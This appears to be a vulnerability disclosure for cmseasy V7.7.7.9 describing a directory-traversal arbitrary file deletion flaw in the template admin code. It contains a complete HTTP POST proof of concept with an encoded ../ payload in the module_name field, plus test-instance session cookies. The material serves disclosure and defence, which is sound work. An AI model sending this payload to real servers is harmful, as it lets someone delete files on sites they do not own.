# cmseasy V7.7.7.9 20240105  has an arbitrary file deletion vulnerability
The affected source code file is lib/admin/template_admin.php, in the editcategorytemplate_action function
![屏幕截图 2024-02-08 005713(1)](https://github.com/sec-Kode/cve/assets/46676387/8bd6243b-0274-44d4-834d-45f4f2cb8a53)

There is an operation to delete the template cache, and there is no filtering, so you can jump to the directory through ../ to delete php files in other directories at will.
<img width="1280" alt="屏幕截图 2024-02-08 005753" src="https://github.com/sec-Kode/cve/assets/46676387/75cfbeb8-6c56-4ef9-bf8a-5e4220de0833">
![屏幕截图 2024-02-08 005813(1)](https://github.com/sec-Kode/cve/assets/46676387/faf471e6-ed2b-4368-98bb-be751e401a0f)

![屏幕截图 2024-02-08 005813(1)](https://github.com/sec-Kode/cve/assets/46676387/0d8109eb-c52e-4873-af93-34231d7856a7)



First add a 2.php file under the CmsEasy_7.7.7_UTF-8_20240105\cn\template file. Normally, you can only delete /cache/template/'.lang::getistemplate().'/buymodules/'. $module_type.'/'.$module_name.'/#'.$module_id. The spliced ​​php file cannot delete the previous php file.
<img width="956" alt="屏幕截图 2024-02-08 010700" src="https://github.com/sec-Kode/cve/assets/46676387/2df91ef7-b448-4394-8e2f-1e8b6f77b37b">

First log in to the administrator backend (/admin), and then use the following POC
<img width="1280" alt="image" src="https://github.com/sec-Kode/cve/assets/46676387/dc802db9-9eb4-42e3-922e-cd0052b3da46">

POC：
```
POST /index.php?case=template&act=editcategorytemplate&admin_dir=admin HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 91
Origin: http://127.0.0.1
Connection: close
Referer: http://127.0.0.1/index.php?case=template&act=editcategorytemplate&admin_dir=admin
Cookie: PHPSESSID=202i8cbtlhlm9kmg95htiu1rb0; loginfalse=0; sidebar_backgroundImage=url("http://127.0.0.1/common/plugins/switcher/images/bg/01.jpg"), linear-gradient(45deg, rgb(51, 51, 51), rgb(51, 51, 51)); login_username=admin; login_password=hPJmzhrr-c1TJPHwEkqS3kG4Le7RnPpQ2kVc6QGW7sOeX2ab18391e6e61e99aff8e10d05e4ad02
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1

id=1&module_name=213&module_name=%7Btag_buymodules_category_s_1_%2F..%2F..%2F..%2F..%2F2%7D
```
<img width="953" alt="屏幕截图 2024-02-08 011121" src="https://github.com/sec-Kode/cve/assets/46676387/baad2e02-9b30-4152-9558-d81133ec85f7">

2.php file was successfully deleted

For the specific process, we can also modify the previous source code and add a $a to print the path of the deleted file.
![屏幕截图 2024-02-08 005753(1)](https://github.com/sec-Kode/cve/assets/46676387/bc730eb0-a219-4a5b-9ec5-e81044f9f267)

The normal deletion path is like this
<img width="1280" alt="屏幕截图 2024-02-08 011628" src="https://github.com/sec-Kode/cve/assets/46676387/ec49d46c-42b0-4ba7-8fbc-ab059206b8d6">


However, if you add ../../ in front of 2, directory traversal will be achieved, thereby deleting the 2.php file under CmsEasy_7.7.7_UTF-8_20240105\cn\template
<img width="1280" alt="屏幕截图 2024-02-08 021335" src="https://github.com/sec-Kode/cve/assets/46676387/888acbe6-7ef9-4a4d-8055-006edf51803d">

<img width="945" alt="屏幕截图 2024-02-08 012236" src="https://github.com/sec-Kode/cve/assets/46676387/269fdfe3-daa0-4258-a1b5-1e11b1652a7e">

Successfully deleted

<img width="1280" alt="屏幕截图 2024-02-08 012111" src="https://github.com/sec-Kode/cve/assets/46676387/6c52a860-b546-4994-b086-e356cd78be9f">

